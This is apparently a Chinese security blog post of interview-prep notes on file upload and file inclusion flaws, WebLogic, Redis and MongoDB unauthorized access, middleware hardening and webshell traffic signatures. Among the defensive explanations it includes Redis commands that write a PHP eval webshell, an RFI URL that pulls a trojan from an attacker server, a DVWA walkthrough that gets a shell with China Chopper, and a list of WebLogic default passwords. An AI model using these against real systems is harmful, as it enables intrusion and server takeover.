<li>如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。</li>
<li>服务器返回上传结果给客户端，告知用户文件是否上传成功。</li>
</ol>
<p>需要注意的是，文件上传涉及到的安全问题较多，例如上传的文件可能会包含病毒、木马等恶意程序，攻击者可能会利用上传漏洞上传恶意文件，从而导致服务器被控制。因此，在进行文件上传功能开发时，需要仔细考虑安全问题，并采取相应的防御措施，例如限制上传文件大小、过滤不安全的文件类型等。</p>
<hr>
<p><strong>文件上传攻击特征？</strong></p>
<p>文件上传攻击是指攻击者通过网站上的文件上传功能，上传恶意文件来执行攻击。以下是一些文件上传攻击的特征：</p>
<ol>
<li>文件类型绕过：攻击者可能会尝试上传不受支持的文件类型，或者将文件类型伪装成其他类型，以绕过文件类型检查。</li>
<li>文件名欺骗：攻击者可能会使用诱人的文件名称来欺骗用户下载或打开恶意文件。</li>
<li>文件内容：上传的文件可能包含恶意代码、木马、病毒等恶意程序，这些程序可被用于攻击和控制目标系统。</li>
<li>大小限制绕过：攻击者可能会尝试绕过文件大小的限制，上传超过规定大小的文件。</li>
<li>目录遍历：攻击者可能会通过在文件名中插入../等字符来遍历目标服务器上的目录，获取敏感信息或执行攻击。</li>
</ol>
<p>如果您担心自己的网站可能会受到文件上传攻击，请确保实施足够的安全措施，如限制上传文件类型、大小和数量、对上传的文件进行检查、将上传的文件保存在安全的位置，并为所有上传的文件生成一个唯一的文件名。</p>
<p><strong>文件上传加固方法？</strong></p>
<ol>
<li>文件类型和大小限制：在服务器端对上传的文件进行检查，确保上传的文件类型、大小和数量符合预期。可以使用白名单方式进行限制，只允许上传特定类型的文件。</li>
<li>检查文件内容：在服务器端对上传的文件进行检查，确保它们不包含恶意代码或病毒等危险内容。可以使用杀毒软件或安全扫描工具来帮助检查上传的文件。</li>
<li>重命名文件：将上传的文件保存在一个新的随机生成的文件名下，而不是使用用户提供的文件名。这样可以避免攻击者通过伪造文件名来欺骗用户。</li>
<li>存储位置：将上传的文件保存在与网站主目录分离的位置上，以避免攻击者上传Webshell等恶意脚本，并能够防止攻击者直接访问上传的文件。</li>
<li>使用安全上传类库：使用安全的上传类库或框架，如Apache Commons FileUpload、SecureFileUploader等。</li>
<li>HTTPS加密：在传输过程中使用HTTPS协议加密，以避免数据在传输过程中被窃听或篡改。</li>
<li>日志审计：记录所有的文件上传操作并定期审计日志，以便发现异常上传行为，及时采取措施。</li>
</ol>
<p>总之，防止文件上传攻击需要综合考虑多种因素，包括文件类型、大小、内容、存储位置、传输方式等，同时定期进行安全审计，并且对于应用程序代码的编写需要充分考虑安全因素。</p>
<p><strong>文件上传绕过方式：</strong></p>
<p>1- 前端JS突破：抓包修改文件名 或者 禁用当前浏览器的JS脚本</p>
<p>​		2- 后端突破：</p>
<p>​			2.1-黑名单：00截断、大小写、空格点、 php 1234567 、phphtml、分布式文件上传、文件流绕过….</p>
<p>​			2.2-白名单：比较鸡肋的00截断、双文件名…</p>
<p>​             内存木⻢已经注入，如何查杀？</p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731174417138.png" alt="image-20230731174417138"></p>
<h2 id="二、文件包含"><a href="#二、文件包含" class="headerlink" title="二、文件包含"></a>二、文件包含</h2><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函 数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件 包含。服务器执行 PHP 文件时，可以通过包含函数加载另一个文件中的  PHP 代码， 并且当 PHP 来执行，这会为开发者节省大量的时间。</p>
<p><strong>产生漏洞的原因</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
    $var = $GET['page'];
    include($var . ".html");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这是一段 PHP 代码，从代码上分析可以看出， 把一个 GET 请求的参数 “page” 传给了一个变 量  filename，然后包含了这个变量。然而，开发者没有对 $_GET [‘page’] 参数经过严格的过滤。直接带入了 include  的函数，我们可以修改 $_GET [‘page’] 的值，包含自己想看的文件。 （文件的路径一定要对，不对的话就包含不了）</p>
<p>这样，我们总结一下，<strong>文件包含漏洞就是</strong>： 程序开发人员一般希望代码更灵活，所以将被<strong>包含的文件设置为变  量</strong>，用来进行<strong>动态调用</strong>，文件<strong>包含函数加载的参数</strong>没有经过<strong>过滤</strong>或者严格的<strong>定义</strong>，可以被用户控制，包含其他恶意  文件，导致了执行了<strong>非预期的代码</strong>。从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p>
<p><strong>包含函数<em>有那些</em></strong></p>
<p>PHP 中文件包含函数有以下四种：</p>
<ul>
<li><p>require () 只要程序一运行就包含文件，找不到被包含的文件时会产生致命 错误，并停止脚本</p>
</li>
<li><p>require_once ()  若文件中代码已被包含则不会再次包含</p>
</li>
<li><p>include () 执行到 include 时才包含文件，找不到被包含文件时只会产生警告， 脚本将继续执行</p>
</li>
<li><p>include_once () 若文件中代码已被包含则不会再次包含</p>
<p><strong>文件包含漏洞利用条件</strong></p>
<ul>
<li>程序用 include () 等文件包含函数通过动态变量的范式引入需要包含的文件 </li>
<li>用户能够控制该动态变量 </li>
<li>要保证 php.ini 中 allow_url_fopen 和 allow_url_include 要为 On</li>
</ul>
</li>
</ul>
<p><strong>文件包含漏洞的分类</strong></p>
<ul>
<li><p>本地包含</p>
<p>可以包含本地文件，在条件允许时甚至能执行代码 读敏感文件，读 PHP 文件包含日志文件 GetShell 包含 data: 或 php://input 等伪协议 若有 phpinfo 则可以包含临时文件 配合上传图片马，然后包含从而 GetShell</p>
</li>
<li><p>远程包含</p>
<p>包含远程的木马或病毒文件，从而 GetShell</p>
</li>
</ul>
<p>注意：要实现远程文件包含需要 allow_url_fopen 和 allow_url_include 都开启</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
    $var = $GET['page'];
    include($var . ".html");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>在包含变量 $var 时，限制了只允许包含 “.html”  格式的文件，这就阻止了一些非法的包含其他文件的情况。</p>
<p><strong>文件包含绕过限制  ：</strong></p>
<p>绕过后面的 “. Html” 限制有很多方法可以实现</p>
<ol>
<li><p>%00 截断</p>
<p>就是在 url 后面输入 %00</p>
<p>条件： allow_url_fopen = Off php 版本 &lt; 5.3.4</p>
</li>
<li><p>长路径截断 </p>
<p>条件：windows OS，点号需要长于 256；linux OS 长于 4096 windows 下目录最大长度为 256 字节，超出的部分会被丢 弃 linux 下目录最大长度为 4096 字节</p>
</li>
<li><p>点点点点点号绕过</p>
<p>点号绕过的原理和长路径截断的一样： 原理是： windows 下目录最大长度为 256 字节， 超出的部分会被丢弃 linux 下目录最大长度为 4096 字节，  超出的部分会被丢弃 所以用….. 绕过的时候 windows 系统 中，点号需要长于 256 ；linux 系统 中点号要长于 4096</p>
<p><strong>开启包含功能的条件   ：</strong></p>
<p>想要开启文件包含的 功能， 首先要修改 PHP 的配置 文件（PHP.ini）把文件里的功能选项开启。</p>
<p>在 Linux 中 PHP.ini 配置文件一般默认安装 在 /etc 目 录 下 。 下面是 两 个 功 能选项 ： </p>
<ul>
<li><p>allow_url_fopen ：</p>
<p>on 默认 开 启 该选项 为 on 便 是 激活了 URL 形式 的 fopen 封装协议使得可以访问 URL 对 象文件等。</p>
</li>
<li><p>allow_url_include ：</p>
<p>off 默认关闭，该选项 为 on 便 是允许 包含 URL 对 象文件等自己有没有实操过文件上传配合文件包含漏洞？</p>
</li>
</ul>
</li>
</ol>
<p><strong>自己有没有实操过文件上传配合文件包含漏洞？</strong></p>
<p>发现一个上传文件页面，但只能上传图片。</p>
<p>我们可以利用火狐来绕过限制，首先设置浏览器的代理为 127.0.0.1 端口为 8080，然后打开 burp suite 工具待用 ，然后再次上传我们的木马文件，这时候 burp suite  工具会闪烁， 我们进入 burp suite ，发现找到了我们 刚刚发送的数据包，接下来我们需要修改一下文件格式这一选项， 把它的格式改为  image/jpeg，我们这么做的目的为了是欺骗一下服务器端的验证，让它以为是这是一个图片格式 的文件。我们点击一下 Forward ,  把它放过 然后切换到浏览器，我们发现文件上传成功了。</p>
<p>我们先把 BP 给关掉，然后再用文件包含的方式对上传上去的文件进行访问，查看文件是否真的上传成功文件上传成功！ 接下来我们使用中国菜刀连接一下我们的木马文件。</p>
<p>打开我们的中国菜刀，在地址栏中填上我们木马文件上传到的路径， 这里采用文件包含的形式 <a target="_blank" rel="noopener" href="http://www.any.com/index.php?page=dvwa/hackable/uploads/shell.php">http://www.any.com/index.php?page=dvwa/hackable/uploads/shell.php</a> 密码为 f</p>
<p>脚本类型改为 PHP，点击添加之后，双击我们的链接进入 成功获取了 shell！！！</p>
<p><strong>远程文件包含是什么？</strong></p>
<p>远程文件包含本质上和 LFI (本地文件包含) 是同一个概 念，只是被包含的 “文件源” 不是从本次磁盘上获得，而 是从外部输入流得到。 如果 PHP 的配置选项  allow_url_include 为 ON 的话， 则 include/require 函数可以加载远程文件，这种漏洞被称为  “远程文件包含漏洞 (Remote File Inclusion RFI)”。</p>
<p>注意：如果是包含远程服务器上的 PHP 文件，那么得到的是被远程服务器解析过的 PHP，所以在写一句话木马的 时候就不要做成 .php 的文件 ，一般做成 .txt 的文件，再让它包含过来。</p>
<p>我们用 windows server 2003 服务器包含一个 Linux 上 的 phpinfo.php 文件，那么得到的就是 Linux 的 php 配置文件 ，而不是 Windows 上的 php 配置信息。</p>
<p>我们已知 192.168.173.128 这台服务器中存在着文件包含漏洞，我们想要通过远程包含自己的服务器上的木马文件，首先，我们在自己的服务器  192.168.173.129 上新建一 个文件 2.txt。我们通过远程包含文件包含到 192.168.173.128 这台目标 服务器上，  包含的方式与本地包含的方式类似： <a target="_blank" rel="noopener" href="http://192.168.173.128/index.php?page=http://192">http://192.168.173.128/index.php?page=http://192</a>. 168.173.129/2.txt。然后我们访问，若看到页面显示正常，说明文件包含成功。</p>
<h2 id="二、weblogic原理"><a href="#二、weblogic原理" class="headerlink" title="二、weblogic原理"></a>二、weblogic原理</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173434963.png" alt="image-20230731173434963"></p>
<p><strong>WebLogic 权限绕过的姿势？</strong></p>
<p><code>CVE-2020-14883</code> 是一个 <code>Console</code> 的未授权访问，而 <code>CVE-2020-14883</code> 是在利用未授权访问的前提下，在 <code>Console</code> 进行代码执行，于是远程攻击者可以构造特殊的 <code>HTTP</code> 请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，并在 <code>WebLogic Server Console</code> 执行任意代码。</p>
<p>1、 通过静态资源来绕过权限验证，防止被重定向到登陆界面。</p>
<p>2、 通过请求 <code>.portal</code> ，控制处理的 <code>Servlet</code> 是渲染 <code>UI</code> 的 <code>MBeanUtilsInitSingleFileServlet</code> 。</p>
<p>3、 通过编码后的 <code>../</code> ，让最终渲染的模版是 <code>console.portal</code> 。</p>
<p>综合起来，才造成了最终的未授权访问。</p>
<p><strong>Weblogic 漏洞扫描工具</strong></p>
<p>安装工具：</p>
<ol>
<li><p>安装依赖 python &gt;= 3.6 <code>pip3 install requests</code></p>
</li>
<li><p>下载 weblogicScanner</p>
<p><a target="_blank" rel="noopener" href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p>
</li>
<li><p>进入 weblogicScanner</p>
</li>
<li><p>举例：测试本机是否存在漏洞 `python ws.py -t 127.0.0.1</p>
</li>
</ol>
<p><strong>WebLogic 常用弱口令</strong>：</p>
<pre class="line-numbers language-none"><code class="language-none">weblogic Oracl@123
weblogic weblogic
guest guest
portaladmin portaladmin
admin security
joe password
mary password
system security
wlcsystem wlcsystem
wlcsystem sipisystem
system password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>weblogic漏洞</strong></p>
<pre class="line-numbers language-none"><code class="language-none">Weblogic 反序列化漏洞 CVE-2021-2394
Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109
Weblogic RCE CVE-2020-14882&amp;14883
weblogic jndi注入CVE-2020-14841
Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644)
WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645
WebLogic CVE-2020-14756 T3IIOP反序列化RCE
Weblogic 远程代码执行漏洞 CVE-2020-2883
Weblogic CVE-2020-2551 IIOP协议反序列化rce
Weblogic反序列化漏洞 CVE-2019-2890
Weblogic反序列化远程代码执行漏洞CVE-2019-2725
Weblogic反序列化漏洞 CVE-2019-2729
Weblogic任意文件读取漏洞（CVE-2019-2615)）
Weblogic 文件上传漏洞（CVE-2019-2618）
weblogic 反序列化漏洞 CVE-2018-3252
Weblogic反序列化远程代码执行漏洞 CVE-2018-3245
Weblogic远程代码执行漏洞 CVE-2018-3191
Weblogic任意文件上传漏洞（CVE-2018-2894）
Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893
Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628
WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）
Weblogic 反序列化漏洞 CVE-2017-3506
Weblogic 反序列化漏洞 CVE-2017-3248
Weblogic SSRF漏洞 CVE-2014-4210<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="二、常见未授权漏洞"><a href="#二、常见未授权漏洞" class="headerlink" title="二、常见未授权漏洞"></a>二、常见未授权漏洞</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180206524.png" alt="image-20230731180206524"></p>
<p><strong>redis</strong>   ：  端口开放到公网，默认可能没有配置用户名，利用未授权访问进去写shell，或者通过ssh的公钥进行反弹</p>
<h3 id="二、redis"><a href="#二、redis" class="headerlink" title="二、redis"></a>二、redis</h3><p><strong>简述一下Redis 未授权访问漏洞。</strong></p>
<p><strong>Redis 默认情况下，会绑定在 0.0.0.0:6379</strong>，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将  <strong>Redis 服务暴露到公网上</strong>，如果在没有设置<strong>密码认证</strong>（<strong>一般为空</strong>），会导致<strong>任意用户</strong>在<strong>可以访问目标服务器的情况下</strong><strong><strong>未授权访问</strong></strong> Redis 以及<strong>读取  Redis 的数据</strong>。攻击者在未授权访问 Redis 的情况下，可以<strong>利用 Redis 自身的提供</strong>的 <strong>config 命令</strong>像目标主机写  WebShell、写 SSH 公钥、创建计划任务<strong>反弹 Shell</strong> 等。其思路都是一样的，就是先将 Redis 的<strong>本地数据库存放目录设置为 web 目录、</strong>~/.ssh 目录或 /var/spool/cron 目录等，然后将  dbfilename（<strong>本地数据库文件名</strong>）设置为文件名你想要写入的文件名称，最后再执行 <strong>save</strong> 或 <strong>bgsave</strong>  保存，则我们就指定的目录里写入指定的文件了。</p>
<p>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网。 没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config set dir /var/www/html/ 
config set dbfilename shell.php
set xxx "&lt;?php eval($_POST[whoami]);?&gt;" 
save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>Redis 未授权访问漏洞如何利用？</strong></p>
<blockquote>
<p>服务端的 Redis 连接存在未授权，在攻击机上能用 redis-cli 直接登陆连接，并未登陆验证。 开了服务端存在 Web 服务器，并且知道 Web 目录的路径（如利用 phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限。</p>
</blockquote>
<p><strong>未授权的条件，修复方式</strong></p>
<p>Redis 未授权访问是指某些 Redis 实例的访问控制没有得到正确配置，导致攻击者可以通过不需要认证的方式直接连接该实例并进行操作。这可能会导致敏感数据泄露、系统被攻击等安全问题。</p>
<p>修复 Redis 未授权访问的方式包括以下几个步骤：</p>
<ol>
<li>确认是否存在未授权访问：通过检查日志和网络流量等信息，确认是否存在未授权访问的情况。</li>
<li>修改 Redis 配置文件：在 redis.config 配置文件中，找到 bind 参数并将其设置为 Redis 监听的 IP 地址。此外，还需要设置 requirepass 参数，并设置一个强密码来保护 Redis 数据库。</li>
<li>重新启动 Redis 服务：在修改完 Redis 配置文件后，需要重新启动 Redis 服务，以便使新的配置生效。</li>
<li>禁用 Redis 远程访问：如果您的 Redis 服务只在本地使用，则应禁用 Redis 的远程访问，以降低攻击面和提高安全性。</li>
<li>定期更新 Redis 和操作系统补丁：及时更新 Redis 和操作系统的安全补丁，以修复已知漏洞和提高系统安全性。</li>
</ol>
<p>总之，在修复 Redis 未授权访问时，我们需要先确认是否存在未授权访问的情况，然后按照上述步骤进行修复。为了保证系统安全，我们还需要经常检查 Redis 配置文件和操作系统状态，及时更新补丁，并定期进行安全审计和漏洞扫描等操作。</p>
<h3 id="二、MongoDB-未授权访问漏洞"><a href="#二、MongoDB-未授权访问漏洞" class="headerlink" title="二、MongoDB 未授权访问漏洞"></a>二、MongoDB 未授权访问漏洞</h3><p> <a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/mongodb?from=10680">MongoDB</a> 服务安装后，默认未开启权限验证。如果服务监听在 0.0.0.0，则可远程无需授权访问<a target="_blank" rel="noopener" href="https://cloud.tencent.com/solution/database?from=10680">数据库</a>。</p>
<p>​    3.0 之前版本的 MongoDB, 默认监听在 0.0.0.0，3.0 及之后版本默认监听在 127.0.0.1。</p>
<p>​    3.0 之前版本，如未添加用户管理员账号及数据库账号，使用 –auth 参数启动时，在本地通过 127.0.0.1 仍可无需账号密码登陆访问数据库，远程访问则提示需认证；</p>
<p>​    3.0 及之后版本，使用 –auth 参数启动后，无账号则本地和远程均无任何数据库访问权限。</p>
<h2 id="三、常见中间件漏洞"><a href="#三、常见中间件漏洞" class="headerlink" title="三、常见中间件漏洞"></a>三、常见中间件漏洞</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175913646.png" alt="image-20230731175913646"></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180017470.png" alt="image-20230731180017470"></p>
<p><strong>中间件基线规范（APACHE）</strong></p>
<p>Apache 是一款常用的 Web 服务器软件，为了保障其安全可靠地运行，可以制定中间件基线规范。以下是 Apache 中间件基线规范的一些重要措施：</p>
<ol>
<li>版本号管理：定期检查并更新 Apache 版本，及时安装最新版本的补丁与安全更新。</li>
<li>配置文件规范：对 Apache 的配置文件进行规范化和审计，限制网站访问权限、禁止目录浏览等。</li>
<li>日志管理：启用 Apache 访问日志和错误日志，定期清理日志文件并做好备份、归档等工作。</li>
<li>安全加固：如禁用不必要的模块、关闭 TRACE 请求响应、限制 HTTP 方法等。</li>
<li>SSL/TLS 加强：设置 TLS 选项、开启 HSTS、使用证书身份验证等。</li>
<li>防火墙和反向代理策略：通过防火墙等技术来过滤恶意流量，使用反向代理策略限制直接连接到 Web 服务器的 IP 地址。</li>
<li>应用安全：对 Web 应用程序进行安全审计，确保程序的漏洞被修复、未受到攻击等。</li>
</ol>
<p>需要注意的是，以上这些措施只是 Apache 中间件基线规范的一部分，实际操作中还需要根据具体情况进行评估和调整。同时，要保障 Apache 服务器的安全性和可靠性，还需要定期备份数据、优化性能等工作。</p>
<hr>
<p><strong>中间件常见漏洞</strong></p>
<p>中间件是指应用程序和操作系统之间的软件组件，常见的中间件漏洞有以下几种：</p>
<ol>
<li>Web服务器漏洞：针对Web服务器（如Apache、Nginx）的攻击通常包括利用目录遍历、文件包含、SQL注入等技术。</li>
<li>数据库漏洞：数据库（如MySQL、Oracle、SQL Server）的漏洞通常涉及未授权的访问、SQL注入等方面。</li>
<li>应用服务器漏洞：应用服务器（如Tomcat、JBoss、WebLogic）的漏洞通常会导致远程执行代码、拒绝服务等问题。</li>
<li>消息队列漏洞：消息队列（如RabbitMQ、Kafka）的漏洞通常涉及未授权访问、拒绝服务等问题。</li>
<li>缓存服务器漏洞：缓存服务器（如Redis、Memcached）的漏洞通常包括未授权访问、命令注入等问题。</li>
<li>中间件配置问题：中间件的错误配置也可能导致安全问题，比如弱密码、不安全的协议配置等。</li>
</ol>
<p>需要注意的是，中间件漏洞是日益增多的，因此建议及时更新和修补中间件的安全漏洞。</p>
<hr>
<p><strong>常见中间件的配置文件路径知道哪些？</strong></p>
<p>不同的中间件软件有不同的配置文件路径。以下是几种常见中间件软件的配置文件路径：</p>
<ol>
<li>Apache Web 服务器：httpd.conf 文件通常位于 /etc/httpd/ 或者 /usr/local/apache2/conf/ 目录下。</li>
<li>Nginx Web 服务器：nginx.conf 文件通常位于 /etc/nginx/ 或者 /usr/local/nginx/conf/ 目录下。</li>
<li>MySQL 数据库：my.cnf 文件通常位于 /etc/mysql/ 或者 /usr/local/mysql/etc/ 目录下。</li>
<li>PostgreSQL 数据库：postgresql.conf 和 pg_hba.conf 文件通常位于 /var/lib/pgsql/data/ 或者 /etc/postgresql/<version>/main/ 目录下。</version></li>
<li>Oracle 数据库：initSID.ora 和 listener.ora 文件通常位于 $ORACLE_HOME/dbs/ 目录下。</li>
<li>Tomcat 应用服务器：server.xml、context.xml 和 web.xml 文件通常位于 /conf/ 目录下。</li>
<li>JBoss 应用服务器：standalone.xml 和 standalone-full.xml 文件通常位于 /standalone/configuration/ 目录下。</li>
</ol>
<p>需要注意的是，这些路径可能会根据不同的操作系统而有所不同，并且也会随着中间件版本的更新而变化。因此，在进行中间件配置时，建议查询官方文档或参考相关文献以获取最新的配置文件路径信息。</p>
<h2 id="二、Struts2-漏洞"><a href="#二、Struts2-漏洞" class="headerlink" title="二、Struts2 漏洞"></a>二、Struts2 漏洞</h2><p>Struts2 是 apache 项目下的一个 web 框架，使用 OGNL 作为默认的表达式语言，由于 OGNL  能够创建或更改可执行代码，因此能够为使用它的任何框架引入严重的安全漏洞，多个 Apache Struts 2 版本容易受到 OGNL  安全漏洞的攻击。</p>
<h2 id="三、thinkphp漏洞原理："><a href="#三、thinkphp漏洞原理：" class="headerlink" title="三、thinkphp漏洞原理："></a>三、thinkphp漏洞原理：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731174450857.png" alt="image-20230731174450857"></p>
<h2 id="二、常问的端口信息："><a href="#二、常问的端口信息：" class="headerlink" title="二、常问的端口信息："></a>二、常问的端口信息：</h2><p>21：（FTP）：FTP服务常用于文件传输，常见漏洞包括弱口令、任意文件上传漏洞等。<br>22：（SSH）：SSH是远程登录系统的协议，常见漏洞包括弱口令、暴力破解、身份验证绕过等。</p>
<p>23：（Telnet）：Telnet是一个远程控制协议，常见漏洞包括明文传输敏感信息、会话劫持等。<br>25：（SMTP）：SMTP是发送电子邮件的标准协议，常见漏洞包括垃圾邮件滥用、反射攻击等。</p>
<p>53：（DNS）：DNS是域名解析服务，常见漏洞包括DNS缓存投毒、DDoS攻击等。<br>80/443 ：（HTTP/HTTPS）：HTTP/HTTPS是Web服务器常用的协议，常见漏洞包括SQL注入、XSS跨站脚本攻击、文件上传漏洞等。<br>443：HTTPS安全超文本传输协议</p>
<p>135（RPC）：RPC是远程过程调用协议，常见漏洞包括缓冲区溢出、拒绝服务攻击等。</p>
<p>139/445（SMB）：SMB是Windows系统的文件共享协议，常见漏洞包括远程代码执行、密码破解等。</p>
<p>3389（RDP）：RDP是Windows远程桌面协议，常见漏洞包括弱口令、暴力破解、远程代码执行等。</p>
<p>1433：MSSQL<br>3306：MYSQL<br>3389：windows远程桌面服务端口<br>7701：weblogic<br>8080：TCP,HTTP协议代理服务器：Apache-tomcat默认端口号</p>
<p>以上仅是一些常见的端口及其漏洞，实际上还有很多其他的端口和漏洞。为了减少被攻击的风险，建议定期进行安全扫描，及时修复已知漏洞，并加强网络安全防护。</p>
<p>拿到webshell不出网情况下怎么办:<br>reg上传去正向连接。探测出网协议，如dns，icmp。</p>
<h2 id="二、冰蝎3-0流量特征："><a href="#二、冰蝎3-0流量特征：" class="headerlink" title="二、冰蝎3.0流量特征："></a>二、冰蝎3.0流量特征：</h2><ol>
<li><h3 id="content-type"><a href="#content-type" class="headerlink" title="content-type"></a>content-type</h3></li>
<li><h3 id="Accept-amp-Cache-Control"><a href="#Accept-amp-Cache-Control" class="headerlink" title="Accept&amp;Cache-Control"></a>Accept&amp;Cache-Control</h3></li>
<li><h3 id="user-Agent"><a href="#user-Agent" class="headerlink" title="user-Agent"></a>user-Agent</h3></li>
<li><h3 id="请求中content-length"><a href="#请求中content-length" class="headerlink" title="请求中content-length"></a>请求中content-length</h3></li>
</ol>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170930747.png" alt="image-20230731170930747"></p>
<h2 id="二、cs的流量特征：50050端口，心跳包"><a href="#二、cs的流量特征：50050端口，心跳包" class="headerlink" title="二、cs的流量特征：50050端口，心跳包"></a>二、cs的流量特征：50050端口，心跳包</h2><h2 id="二、冰蝎4-0的流量特征（和3-0对比观看）："><a href="#二、冰蝎4-0的流量特征（和3-0对比观看）：" class="headerlink" title="二、冰蝎4.0的流量特征（和3.0对比观看）："></a>二、冰蝎4.0的流量特征（和3.0对比观看）：</h2><p>v3.0 和 v4.0 的区别很明显在于这里 <code>$_SESSION['k']=$key</code>，v3.0 版本当中会把 key 作为 session 传入；接着判断 <code>extension_loaded</code>，也就是判断服务端是否存在 <code>openssl</code>拓展，如果不存在就用 base64 解码，然后使用 key 进行异或加密，这也是冰蝎 v4.0 版本当中的 <code>xor_base64</code>加密方式；如果服务端能够加载 openssl 拓展，就使用 AES128 解密，这里对应冰蝎 v4.0 版本当中的 <code>aes</code>加密方式。</p>
<p><strong>第一阶段-密钥协商</strong></p>
<p>1.攻击者通过 GET 或者 POST 方法，形如 <a target="_blank" rel="noopener" href="http://127.0.0.1/shell.php?pass=645%E7%9A%84%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%86%E9%92%A5%EF%BC%9B">http://127.0.0.1/shell.php?pass=645的请求服务器密钥；</a></p>
<p>2.服务器使用随机数 MD5 的高16位作为密钥，存储到会话的 <code>$_SESSION</code>变量中，并返回密钥给攻击者。</p>
<p><strong>第二阶段-加密传输</strong></p>
<p>1）客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端；</p>
<p>2）服务端接受密文后进行 AES 或 XOR 运算解密，执行相应的命令；</p>
<p>3）执行结果通过 AES 加密后返回给攻击者。</p>
<ul>
<li>但是我自己在分析的过程中并没有看到这个密钥协商的过程，同时也没有看到 <code>$_SESSION</code>变量当中存储了 md5 的高 16 位，反而 <code>$_SESSION</code>变量存储的是一个 26 位的字符。不知道这里是我的问题还是冰蝎 4.0 版本就是如此。</li>
</ul>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731172240969.png" alt="image-20230731172240969"></p>
<h2 id="二、菜刀流量特征："><a href="#二、菜刀流量特征：" class="headerlink" title="二、菜刀流量特征："></a>二、菜刀流量特征：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731172616407.png" alt="image-20230731172616407"></p>
<h2 id="二、蚁剑流量特征"><a href="#二、蚁剑流量特征" class="headerlink" title="二、蚁剑流量特征:"></a>二、蚁剑流量特征:</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173230742.png" alt="image-20230731173230742"></p>
<h2 id="二、哥斯拉流量特征："><a href="#二、哥斯拉流量特征：" class="headerlink" title="二、哥斯拉流量特征："></a>二、哥斯拉流量特征：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173320610.png" alt="image-20230731173320610"></p>
<h2 id="三、wireshark使用规则"><a href="#三、wireshark使用规则" class="headerlink" title="三、wireshark使用规则"></a>三、wireshark使用规则</h2><pre class="line-numbers language-none"><code class="language-none">【过滤ip】：过滤源ip地址:ip.src1.1.1.1;目的ip地址：ip.dst1.1.1.1;
【过滤端口】：过滤80端口：tcp.port80，源端口：tcp.srcport80，目的端口：tcp.dstport==80
【协议过滤】：直接输入协议名即可，如http协议http
【http模式过滤】：过滤get/post包http.request.mothod=="GET/POST"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="三、fastjson不出网利用："><a href="#三、fastjson不出网利用：" class="headerlink" title="三、fastjson不出网利用："></a>三、fastjson不出网利用：</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175610705.png" alt="image-20230731175610705"></h2><h2 id="三、存在-反序列化-中间件"><a href="#三、存在-反序列化-中间件" class="headerlink" title="三、存在 反序列化 中间件"></a>三、存在 反序列化 中间件</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175803413.png" alt="image-20230731175803413"></p>
<h2 id="三、nmap常用参数："><a href="#三、nmap常用参数：" class="headerlink" title="三、nmap常用参数："></a>三、nmap常用参数：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180541206.png" alt="image-20230731180541206"></p>
<h2 id="四、怎么绕过-cdn，寻找真实-ip："><a href="#四、怎么绕过-cdn，寻找真实-ip：" class="headerlink" title="四、怎么绕过 cdn，寻找真实 ip："></a>四、怎么绕过 cdn，寻找真实 ip：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180616607.png" alt="image-20230731180616607"></p>
